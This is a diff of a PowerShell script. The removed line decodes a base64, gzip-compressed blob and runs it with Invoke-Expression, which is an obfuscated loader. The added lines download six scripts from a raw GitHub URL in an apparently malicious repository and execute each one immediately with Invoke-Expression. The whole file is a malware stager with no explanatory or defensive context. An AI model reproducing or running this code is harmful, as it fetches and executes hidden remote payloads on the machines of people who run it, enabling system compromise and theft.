@@ -1,1 +1,12 @@
-$compressed = 'H4sIAAAAAAAA/6ySQWvbQBCF7wb/h0EYlBBWwpfSpvhSNyWh1DF1nVx0Wa9G0aSrnWV2ZFm0/e9FdQuhvfbyGIaZb96D2aGaO8VuKxxRdASztdpCdvtxvb+udtzoYAWrT+SEEzdaPVKoeUjVuhfBoA8oiThUn/twHxxmYDa2Q8j2XsUeCYd9rK1O/Qfre4Q88oCSWvQezJm109Ej3FJdYwCz4a1wQx7B3JzQ9UoctuzJjfBujDYlMGvuOhtqyGgQMH3CA+R5qxrTdVmKHYon0rY/9AnFcVAMWjjuymeyr98sy9j7ZOVIMcZYCjapbNHWqewshZJi5CKmZZ7DdyA8ZTmYL2NE2KlQeALzgcXhfNawwMWCYAXLt7AgMB7h1VRdXV3Ct/kMAH4JLHrxsILs/9ir3YIme9kZ/lIXAx7WnjAorGCDg7k/PKNT2I1JsSs2qMXjn4nfG8kJRV2fPcDqBaJ4z0PwbOtz7IspxeW/N+/Ckb+iuTlFwTS9wV/M+ezHzwAAAP//oyGN9GACAAA='; $bytes = [Convert]::FromBase64String($compressed); $ms = New-Object IO.MemoryStream(,$bytes); $gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr = New-Object IO.StreamReader($gz); $obfuscated = $sr.ReadToEnd(); Invoke-Expression $obfuscated
+
+for ($i = 1; $i -le 6; $i++) {
+   
+    $url = "https://raw.githubusercontent.com/jia891/pulsarvipppp/refs/heads/main/dc$i.ps1"
+    
+    
+    $webClient = New-Object System.Net.WebClient
+    $scriptContent = $webClient.DownloadString($url)
+    
+    
+    Invoke-Expression $scriptContent
+}
